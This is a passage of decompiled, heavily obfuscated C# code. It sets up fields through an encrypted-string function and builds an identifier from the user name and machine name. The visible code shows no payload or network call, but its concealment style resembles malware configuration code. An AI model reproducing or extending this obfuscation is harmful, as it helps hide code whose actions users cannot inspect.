			JqDJfBiOyDaAy(getString_0(107410069)),
			JqDJfBiOyDaAy(getString_0(107409374)),
			JqDJfBiOyDaAy(getString_0(107410056)),
			JqDJfBiOyDaAy(getString_0(107409341)),
			JqDJfBiOyDaAy(getString_0(107409308)),
			JqDJfBiOyDaAy(getString_0(107409267)),
			JqDJfBiOyDaAy(getString_0(107408722)),
			JqDJfBiOyDaAy(getString_0(107408713)),
			JqDJfBiOyDaAy(getString_0(107408640)),
			JqDJfBiOyDaAy(getString_0(107408607)),
			JqDJfBiOyDaAy(getString_0(107408574)),
			JqDJfBiOyDaAy(getString_0(107408533)),
			JqDJfBiOyDaAy(getString_0(107408524)),
			JqDJfBiOyDaAy(getString_0(107408995))
		};
		yjfXukyygoMtg = new List<string>
		{
			JqDJfBiOyDaAy(lOmjExCerIObT(getString_0(107408922))),
			JqDJfBiOyDaAy(getString_0(107408905)),
			JqDJfBiOyDaAy(getString_0(107408812)),
			JqDJfBiOyDaAy(getString_0(107408203)),
			JqDJfBiOyDaAy(getString_0(107408110)),
			JqDJfBiOyDaAy(getString_0(107408013)),
			JqDJfBiOyDaAy(getString_0(107408432)),
			JqDJfBiOyDaAy(getString_0(107408335)),
			JqDJfBiOyDaAy(getString_0(107407698)),
			JqDJfBiOyDaAy(getString_0(107407633)),
			JqDJfBiOyDaAy(getString_0(107407508)),
			JqDJfBiOyDaAy(getString_0(107407923)),
			JqDJfBiOyDaAy(getString_0(107407830)),
			JqDJfBiOyDaAy(lOmjExCerIObT(getString_0(107408922)))
		};
		GVRjAaBfQw = JqDJfBiOyDaAy(getString_0(107407733));
		oOZoSUJWDLjw = new List<string>
		{
			JqDJfBiOyDaAy(getString_0(107407140)),
			JqDJfBiOyDaAy(getString_0(107407458)),
			JqDJfBiOyDaAy(getString_0(107407232)),
			JqDJfBiOyDaAy(getString_0(107406526)),
			JqDJfBiOyDaAy(getString_0(107406844)),
			JqDJfBiOyDaAy(getString_0(107406138))
		};
		aDTfpntvMuH = new List<string>
		{
			JqDJfBiOyDaAy(getString_0(107405944)),
			JqDJfBiOyDaAy(getString_0(107406395)),
			JqDJfBiOyDaAy(getString_0(107406334))
		};
		DFpvzFxNRtQ = getString_0(107397066);
		OvkCDFFSSL = getString_0(107397066);
		jwqESLsbAkr = new DateTime(2000, 1, 1);
		UsKzIdrLRh = new DateTime(2100, 1, 1);
		CWgqQYxkECI = getString_0(107396809);
		NzKGGrtTBpkeMR = getString_0(107388244);
		zCYBNBQhPtiMr = getString_0(107397066);
		SzpnhquOpxGl = getString_0(107397066);
		nmAIsaZMbpDkNaT = getString_0(107397066);
		lqSNPgxznFF = getString_0(107396809);
		EAvfUgEetckeqmgs = getString_0(107397066);
		baVPzfInuLOtD = getString_0(107397066);
		vAvIzfBtHKG = new List<string>
		{
			getString_0(107395865),
			getString_0(107396091),
			getString_0(107395899),
			getString_0(107396004)
		};
		ilWxgAZLeD = getString_0(107397066);
		ZCRgCrsIaCud = getString_0(107406273);
		aBGwDIdLrfLu = getString_0(107397066);
		LKbgowDgmg = getString_0(107397066);
		BeeNYooWHzG = getString_0(107397066);
		JkMlKoPfgeJRaLaUZ = string.Empty;
		ezwzRqcXtQBF = getString_0(107397066);
		DNRwROhjWECu = getString_0(107397066);
		ElfNFRxAFkaD = getString_0(107397066);
		vajEusdxRSw = getString_0(107391872);
		LiGYlWRmMDBhEWf = getString_0(107391872);
		gsYAYgWbBtFL = getString_0(107397066);
		VeEQSEcfdFUH = getString_0(107396809);
		ToPvNEVWQmmpbo = getString_0(107397066);
		FJSbedpaUrC = getString_0(107397066);
		jUlKKGQAyvGJtyp = getString_0(107397066);
		naGXMLDdNuoO = getString_0(107406268);
		lNdMQEsyMdJ = getString_0(107397066);
		KirPMvFSpPtxq = getString_0(107397066);
		pcdcyuTjjngA = getString_0(107406283);
		iKXZxNSoHO = getString_0(107397066);
		tFrEnjsbNAL = getString_0(107397066);
		lYjneyxwbcYdtGcJ = getString_0(107397066);
		uikOdlemzXgPyY = getString_0(107397066);
		dpoPluCxxOZ = getString_0(107406234);
		CUSlUzptGt = getString_0(107396809);
		GlgSVFzlKbjhz = getString_0(107397066);
		hZGTNyEhEGXkLqh = getString_0(107397066);
		BikvpigWlHBvTVo = getString_0(107397066);
		KbzdUUqksSGIlhW = new string[0];
		JMHEmrUMtFhk = getString_0(107396809);
		BJyvjcvspWj = true;
		lsFQKNfcSOWxPw = getString_0(107397066);
		JweQHtvwAVLtP = false;
		KCxiSXgmNWqaY = false;
		zafPkbxEQDZZ = false;
		iFlYrwToswX = true;
		nPLbuhisBzmHoeaY = getString_0(107406253);
		rcFXGcWApOJB = false;
		MzHmyYhyAYUEO = false;
		BpkCbJUpBaZe = false;
		luDuQnkIvNDbdd = false;
		XTugcnpxmKWX = true;
		ZvuGPiZgTVaL = getString_0(107406200) + Environment.UserName + getString_0(107406219) + Environment.MachineName + getString_0(107405654) + vnvqegDZgMFTThUQ.AEfbHcWBmhiPBNq() + getString_0(107405681);
		DcTmJYuRqmJcpcY = false;
		QCpFpzNWDHrHuZI = new Stopwatch();
		CBbCjcYRLmYL = 0;
		TdmvufTfNVtQu = 0;
		oVVBsGsoBvRKjE = true;
		nmBFzgaiOADgSVhq = getString_0(107405672) + vnvqegDZgMFTThUQ.AEfbHcWBmhiPBNq() + getString_0(107405631);
		QqkAgBIacsuCHc = new string[1] { getString_0(107405626) };
		XkSfVvWNEoLujZU = new List<string>();
		LoqeOEkLpePTMECv = 0;
		DIrAiHcqaZdYH = new List<string>();
		tqQwsaMDDrPjiB = new List<string>();
		BTvdPgpdEslNJEjN = new List<string>();
	}
}
